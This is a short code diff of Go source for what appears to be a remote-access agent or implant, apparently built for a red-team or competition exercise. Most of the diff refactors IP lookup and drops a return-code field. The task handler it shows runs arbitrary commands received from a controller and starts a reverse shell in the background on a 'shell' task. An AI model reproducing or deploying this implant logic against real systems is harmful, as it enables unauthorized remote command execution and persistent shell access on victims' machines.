@@ -31,28 +31,28 @@ type Task struct {
 }
 
 type Result struct {
-	AgentID    string `json:"agent_id"`
-	TaskID     string `json:"task_id"`
-	Result     string `json:"result"`
-	ReturnCode int    `json:"returncode"`
+	AgentID string `json:"agent_id"`
+	TaskID  string `json:"task_id"`
+	Result  string `json:"result"`
 }
 
 func getLocalIP() string {
-	if runtime.GOOS == "linux" {
+	switch runtime.GOOS {
+	case "linux":
 		cmd := exec.Command("bash", "-c", "hostname -I | awk '{print $1}'")
 		out, err := cmd.Output()
 		if err != nil {
 			return "?.?.?.?" // Fallback if command fails
 		}
 		return strings.TrimSpace(string(out))
-	} else if runtime.GOOS == "freebsd" {
+	case "freebsd":
 		cmd := exec.Command("/bin/sh", "-c", "ifconfig vtnet1 | awk '$1 == \"inet\" {print $2}'") //temp solution for UBHS Spring'26
 		out, err := cmd.Output()
 		if err != nil {
-			return "?.?.?.?" 
+			return "?.?.?.?"
 		}
 		return strings.TrimSpace(string(out))
-	} else {
+	default:
 		addrs, err := net.InterfaceAddrs()
 		if err != nil {
 			return "?.?.?.?"
@@ -106,17 +106,15 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 	case "command":
 		cmd := execCommand(task.Input)
 		out, err := cmd.CombinedOutput()
+		// out,err := execCommand(task.Input) #rewrote to only get output as string, no longer need return code
 		if err != nil {
 			result.Result = string(bytes.ToValidUTF8(out, []byte("?")))
-			result.ReturnCode = cmd.ProcessState.ExitCode()
 		} else {
 			result.Result = string(out)
-			result.ReturnCode = 0
 		}
 	case "shell":
 		go RevShell(task.Input)
 		result.Result = "Interactive shell started in background"
-		result.ReturnCode = 0
 	default:
 		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
 	}
